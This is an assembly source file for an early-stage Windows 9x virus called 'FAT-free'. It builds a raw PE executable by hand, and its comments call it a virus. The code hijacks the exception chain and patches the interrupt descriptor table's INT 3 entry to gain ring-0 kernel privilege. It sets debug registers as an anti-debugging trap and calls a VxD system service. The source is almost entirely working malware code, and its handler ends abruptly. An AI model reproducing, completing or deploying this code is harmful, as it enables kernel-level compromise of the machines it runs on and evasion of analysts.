;****************
;* Information: *
;****************
;**
;* Name: FAT-free
;* Date: 11.02.2026, Version 1.0
;* Last modified: 11.02.2026
;**
;* Assembling:
;* nasm -f bin fat-free.asm -o fat-free.exe
;**
;*=====================================================*
;* Modification history *
;*=====================================================*
;* v1.0
;********************************************************
%define ImageBase 00400000h
cpu 586
bits 32
org 400000h

;**********************************
;* PE and MZ Header, Do not touch *
;**********************************

Header:
.IMAGE_DOS_HEADER:
.e_magic dw 5A4Dh   ; MZ
.e_cblp dw 0090h
.e_cp dw 0003h
.e_crlc dw 0000h
.e_cparhdr dw 0004h
.e_minalloc dw 0000h
.e_maxalloc dw 0FFFFh
.e_ss dw 0000h
.e_sp dw 00B8h
.e_csum dw 0000h
.e_ip dw 0000h
.e_cs dw 0000h
.e_lfarlc dw 0040h
.e_ovno dw 0000h
.e_res times 4 dw 0
.e_oemid dw 0000h
.e_res2 times 10 dw 0
.e_lfanew dd .PE_HEADER - .IMAGE_DOS_HEADER

.DOS_stub:
push cs
pop ds
mov dx, .message - .DOS_stub+40h
mov ah, 09h
int 21h
mov ax, 4C01h
int 21h
.message:
db "This program cannot be run in DOS mode.", 0Dh, 0Ah, "$"

times 128-($-.IMAGE_DOS_HEADER) db 0

.PE_HEADER:
.Signature db 'P', 'E', 0, 0  ; Signature
.Machine dw 014Ch ;i386
.NumberOfSections dw 1
.TimeDateStamp dd 0 
.PointerToSymbolTable dd 0
.NumberOfSymbols dd 0
.SizeOfOptionalHeader dw .OPTIONAL_HEADER_END - .OPTIONAL_HEADER
.Characteristics dw 810Fh
.OPTIONAL_HEADER:
    .Magic                      dw 010Bh           ; PE32 Magic
    .MajorLinkerVersion         db 0x01            ; Linker Version
    .MinorLinkerVersion         db 0x00            ; 
    .SizeOfCode                 dd _SizeOfCode     ; Total code size
    .SizeOfInitializedData      dd 0               ; No initialized data
    .SizeOfUninitializedData    dd 0               ; No BSS
    .AddressOfEntryPoint        dd virus_start - ImageBase ; THE ENTRY POINT (RVA)
    .BaseOfCode                 dd virus_start - ImageBase ; RVA of code start
    .BaseOfData                 dd 0               ; (Often ignored in 32-bit flat)
    .ImageBase                  dd ImageBase       ; 0x400000
    .SectionAlignment           dd 00001000h       ; 4KB (Win9x requirement)
    .FileAlignment              dd 00000200h       ; 512 bytes (Standard)
    .MajorOperatingSystemVersion dw 0004h          ; Windows 4.0 (Win9x)
    .MinorOperatingSystemVersion dw 0000h
    .MajorImageVersion          dw 0000h
    .MinorImageVersion          dw 0000h
    .MajorSubsystemVersion      dw 0004h          ; Windows 4.0
    .MinorSubsystemVersion      dw 0000h
    .Win32VersionValue          dd 0
    .SizeOfImage                dd _SizeOfImage    ; Total memory footprint
    .SizeOfHeaders              dd _SizeOfHeaders  ; Offset to virus_start
    .CheckSum                   dd 0               ; Optional for most EXEs
    .Subsystem                  dw 0002h           ; IMAGE_SUBSYSTEM_WINDOWS_GUI
    .DllCharacteristics         dw 0000h
    .SizeOfStackReserve         dd 00100000h       ; 1MB Stack
    .SizeOfStackCommit          dd 00001000h       ; 4KB Commit
    .SizeOfHeapReserve          dd 00100000h       ; 1MB Heap
    .SizeOfHeapCommit           dd 00001000h       ; 4KB Commit
    .LoaderFlags                dd 0
    .NumberOfRvaAndSizes        dd 00000010h       ; Always 16 Data Directories
.IMAGE_DATA_DIRECTORY:
    .Export                     dq 0               ; No Exports
    .Import                     dq 0               ; No IAT!
    .Resource                   dq 0               ; No Icons/Dialogs
    .Exception                  dq 0               ; No SEH Table (we use FS:[0])
    .Security                   dq 0
    .Basereloc                  dq 0               ; No Relocations
    .Debug                      dq 0
    .Architecture               dq 0
    .Globalptr                  dq 0
    .TLS                        dq 0               ; No Thread Local Storage
    .Load_Config                dq 0
    .Bound_Import               dq 0
    .IAT                        dq 0
    .Delay_Import               dq 0
    .COM_Descriptor             dq 0
    .Reserved                   dq 0
.OPTIONAL_HEADER_END:
.IMAGE_SECTION_HEADER:
    .Name                   db '.text', 0, 0, 0 ; 8-byte UTF-8 name
    .VirtualSize            dd _SizeOfCode      ; Memory size (unaligned)
    .VirtualAddress         dd 00001000h        ; RVA (Must match BaseOfCode)
    .SizeOfRawData          dd _SizeOfRawData   ; Disk size (Aligned to 200h)
    .PointerToRawData       dd 00000200h        ; File offset to virus_start
    .PointerToRelocations   dd 00000000h        ; 0 for EXEs
    .PointerToLinenumbers   dd 00000000h        ; 0 for EXEs
    .NumberOfRelocations    dw 0000h
    .NumberOfLinenumbers    dw 0000h
    .Characteristics        dd 0E0000020h       ; RWE (Read/Write/Execute) + Code
times 508-($-$$) db 0  ; Padding
dd VirusSize

;********************************************
; End of Headers *
;********************************************

;********************************************
;* Constants *
;********************************************
HookExceptionNumber equ 3h
_SizeOfHeaders equ (virus_start - Header) 
_SizeOfImage equ ((virus_end - Header + 0xFFF) & ~0xFFF)

;********************************************
;* Virus Start *
;********************************************
virus_start:
push ebp
;******************************************
;* First order of buisness is *
;* to modify SEH So that if an exceptions *
;* occur we still have control *
;******************************************
lea eax, [esp-4h*2]

xor ebx, ebx
xchg eax, [fs:ebx]

call .get_delta
.get_delta:
pop ebx

lea ecx, [ebx+(ExceptionOccured-.get_delta)]

push ecx
push eax

;***************************
;* Now we need to actually *
;* Hook Int 3h *
;* To actually get Ring 0 *
;***************************

push eax
sidt [esp-02h]
pop ebx              ; EBX = base adress of idt

add ebx, HookExceptionNumber*08h+04h

cli

mov ebp, [ebx]
mov bp, [ebx-04h]

lea esi, [ecx+(IntHandler-ExceptionOccured)] ; ESI = Memory adress of 
                                             ; ExceptionOccured+(IntHandler-ExceptionOccured)
push esi
mov [ebx-04h], si
shr esi, 16
mov [ebx+2h], si
pop esi



int HookExceptionNumber    ; To get ring 0


ExceptionOccured:


IntHandler:
mov ecx, dr3
jcxz AllocateSysPage
iretd

AllocateSysPage:
mov ebx, 'Free'
mov dr3, ebx
mov ebx, dr7
or ebx, 00002080h  ; Hehe, if anyone treis to debug my virus, it will throw an exception
mov dr7, ebx       ; And then I, can handle it

mov eax, 01h
xor ebx, ebx
mov ecx, 01h
mov edx, 02h
xor esi, esi
mov edi, esi
int 20h
dd 00010053h


virus_end:
VirusSize equ $
_SizeOfCode equ $